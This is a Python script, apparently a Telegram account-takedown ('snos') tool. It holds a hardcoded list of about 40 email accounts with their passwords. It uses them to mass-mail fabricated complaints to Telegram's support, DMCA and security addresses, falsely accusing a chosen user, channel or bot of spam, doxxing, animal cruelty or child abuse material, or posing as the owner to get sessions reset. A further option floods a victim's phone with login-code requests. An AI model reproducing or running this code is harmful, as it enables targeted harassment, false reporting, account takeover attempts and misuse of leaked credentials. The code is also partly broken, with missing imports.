import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import pystyle
import time
import colorama

senders = {
    'J.Henry@vysssotsky.ru': 'Pc8xi2YrRfNV0nuhmkQi',
    'M.Young@vysssotsky.ru': 'qFguzvmp147hq8sxaSjS',
  'raumonatuhadi@mail.ru': 'a7r6U9J6KHDaguAsidDH',
    'J.Hines@vysssotsky.ru': 'Qj2nFAwdLYhN4STW4btG',
    'C.Lynch@vysssotsky.ru': 'z4J5Zw9c9Akq8F3D6mjA',
    'R.Greer@vysssotsky.ru': 'fRaUQ01Fpnd2dkX2vSm3',
    'H.Greene@vysssotsky.ru': '6bTMfcqvyGkB9cHVyYbd',
    'C.Stewart@vysssotsky.ru': 'mCTCq7mmHHTvxZtas5PP',
    'A.Owen@vysssotsky.ru': 'WyU98s39zFRsxY2bv9Vd',
    'T.Butler@vysssotsky.ru': '1DqKGwWTiXkc2Eadk4Vd',
    'R.Ward@vysssotsky.ru': 'a10слшы0GsiBHqw017VMPcyA',
    'J.Weaver@info.winshield.space':'v$sss0tsk=3',
    'P.Francis@info.winshield.space':'v$sss0tsk=3',
'korlithiobtennick@mail.ru':'feDLSiueGT89APb81v74',
    'avyavya.vyaavy@mail.ru':'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru':'1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru':'SXxrCndCR59s5G9sGc6L',
 'lovedel.anisss@mail.ru':'cJkiz18MAWS0L85DGW8n',
           'love.efs@mail.ru':'vzw5bwePbzeXhYhDeeA1',
           'fsadfsaf.sdfasdfas@mail.ru':'KUN0wpJbViwpFXFPkHb4',
           'fkjvfmdsof@mail.ru':'CxM2JUT0vx03aSyD53Ns',
           'sawage.dasha@mail.ru':'SyfStmkgK29KUB0BQVAy',
           'opunm.sdaww@mail.ru':'Y1BjSZCHeLTxmvaW49FH',
           'fall.gall@mail.ru':'tFqTgMUqkidcBbw91hD7',
           'wzxcvd@mail.ru':'vwPUnRUGW75MUKaFzhVc',
           'masha.mashala@mail.ru':'rtM0rCSHZstDVQpxmEkh',
           'wwagege@mail.ru':'ZZNkRLrZseLN57phVeEQ',
           'irigjfodjdkdkk@mail.ru':'n8r0TKCygC5xqaWxStr1',
           'sdfghafdhg@mail.ru':'Kag0fefn6mFWMzQ17PGb',
           'dasha.goat@mail.ru':'3bkf9iHyuFUfEfKzXYLm',
           'dasha.goat@mail.ru':'3bkf9iHyuFUfEfKzXYLm',
           'dasha.lovely.02@mail.ru':'paUrCHANKWWxefzaQvQm',
           'dasha.butifull@mail.ru':'0bAbKQUfpVRDcrLtc0Ya',
           'firirotifigj@gmail.com':'RQCgW8vb127AGRZ5Kvf1',
           'dasha.mdaaa@gmail.com':'HXNg0M0bvyaEs1tbMjTB',
           'lfwgdg@mail.ru':'h6hAUvp3KNPqqcmmduU3',
           'dasha.holle@mail.ru':'0g5g6kwEtkKw2hYCaSTj',
           'darya.holly@mail.ru':'he02duEXu4iiDambB6ZG',
           'dasha.vonk@mail.ru':'AayKrKyfEDyeubmRqKRm',
           'kloxc@mail.ru':'FVUeii2MdbNcqEmZr'
           
}
receivers = [
    'support@telegram.org',
    'dmca@telegram.org',
    'security@telegram.org']

banner = """  
 
Создатель: доха
от проекта: @last_breaths
DOXAA SNOOOS

                           1 [+]Snos акаунта 
                           2 [+]Snos канала
                           3 [+]Snos Bota
                           4 [+]res ak   
                           5 [+]flyd codom
                                                                                                                                                                     
"""
colorama.init()


def logo():
    print(colorama.Fore.WHITE + banner)
    print(colorama.Fore.RESET)


def menu():
    return input("Введите цифру: ")


def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(1)
        server.quit()
        return True
    except Exception as e:
        return False


def main():
    sent_emails = 0
    logo()
    choice = menu()
    # 2
    if choice == '1':
        print("1. Спам.")
        print("2. Снос за докс.")
        print("3. Снос тролей.")
        print("4. Снос сессии.")
        print("5. Снос премиум аккаунта")
        print("6. Снос вирт.")
        comp_choice = input("Выбирай: ")
        #soft by jason
        if comp_choice in ["1", "2", "3"]:
            print("Следуй за указаниями.")
            username = input("username: ")
            id = input("id: ")
            chat_link = input("ссылку на чат: ")
            violation_link = input("ссылку на нарушение: ")
            print("начинаю спамить репорты.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю.",
                "2": f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта.",
                "3": f"Здравствуйте уважаемая поддержка телеграмм хочу пожаловаться на пользователя {username}, его айди - {id} Данный пользователь оскорбляет третьих лиц матом а это Статья 213 УК РФ вот ссылка на чат ссылка на чат - {chat_link}, сылка на нарушение/нарушения - {violation_link} Прошу заблокировать данного пользователя. Благодарю за понимание и надеюсь на вашу помощь"
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                                                 violation_link=violation_link.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    time.sleep(2)
        elif comp_choice == "4":
            print("следуй указаниям.")
            username = input("юзернейм: ")
            id = input("айди: ")
            number = input("Номер от аккунта:")
            print("погоди чут чут.")
            comp_texts = {
                "4": f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {id} и номер телефна  {number}. Пожалуйста удалите аккаунт или обнулите сессии"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), number=number. strip())
                    send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    

        elif comp_choice in ["5", "6"]:
            print("следуй указаниям")
            username = input("username: ")
            id = input("id: ")
            comp_texts = {
                "5": f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!",
                "6": f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 9999
                    


    elif choice == "2":

        print("1. С личными данными.")
        print("2. С живодерством. ")
        print("3. С цп.")
        print("4. Прайс.")
        ch_choice = input("выбор: ")
    
        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input("ссылка на канал: ")
            channel_violation = input("ссылка на нарушение (в канале): ")
            print("погоди чут чут.")
            comp_texts = {
                "1": f"Уважаемый агент телеграм,Я обращаюсь к Вам с жалобой на Telegram канал {channel_link}, который нарушает мои права на конфиденциальность личных данных, что противоречит действующим законодательствам УК РФ. Вот ссылка на канал {channel_link} - {channel_violation} В данном канале были опубликованы мои личные данные такие как: Номер телефона,Адрес, Место жительства,Паспортные данные ,Данные моих родственников без моего согласия, что является нарушением закона о защите персональных данных.Я хотел бы запросить следующие меры: 1. Немедленное удаление моих личных данных, опубликованных на указанном канале.2. Принятие мер в отношении владельцев канала в соответствии с действующим законодательством о защите персональных данных.Я прикладываю копии документов, подтверждающих нарушение моих прав на конфиденциальность личных данных.Прошу Вас рассмотреть эту жалобу и принять необходимые меры для урегулирования этой ситуации. Ожидаю ответа с информацией о принятых мерах и результате их реализации.",
                "2": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "3": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "4": f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(),
                                                 channel_violation=channel_violation.strip)
                    send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 100000
                    


    elif choice == "3":
        print("1. Глаз  Бога.")
        print("2. Ждите новой версии.")
        bot_ch = input("Выбор: ")

        if bot_ch == "1":
            bot_user = input("юз бота: ")
            print("погоди чут чут.")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[bot_ch]
                    comp_body = comp_text.format(bot_user=bot_user.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на бота телеграм', comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 1
                    
    if choice == '4':
        print("1. Востановить аккаунт.")
        Akk_ch = input("Выбор: ")

        if Akk_ch in ["1"]:
            print("Следуй за указаниями.")
            username = input("юзернейм: ")
            id = input("айди: ")
            number = input("Номер от аккунта:")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая команда поддержки Telegram. Вы без причины заблокировали мой телеграм аккаунт с номером - {number} , юзернейм - {username} - {id}. Возможно вам поступали жалобы на СПАМ от этого аккаунта, но данное обвинение является ошибкой, так как я никогда не нарушал правила сообщества. В том числе, не спамил, не обзывал других пользователей, не сливал личную информацию какого-либо пользователя. Прошу вас разобраться в ситуации и вернуть мне доступ к аккаунту, спасибо заранее."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[Akk_ch]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), number=number. strip())
                    send_email(receiver, sender_email, sender_password, 'У меня заблокировали телеграмм аккаунт',
                               comp_body)
                    print(f"Отправлено на {receiver} от {sender_email}!")
                    sent_emails += 14888
                    


    if choice == '5':
        number = int(input("Введите номер телефона: "))
        count = 0

        try:
            for _ in range(3):  # Количество повторений
                user = fake_useragent.UserAgent().random
                headers = {'user-agent': user}

                # Отправка POST-запросов на каждый URL
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})

                count += 1
                # Один цикл = 10 кодов
                print(colored(f"Коды успешно отправлены", 'cyan'))
                print(colored(f"Всего циклов: {count} ", 'cyan'))
        except Exception as e:
            print('[!] Ошибка, проверьте вводимые данные:', e)



if __name__ == "__main__":
    main()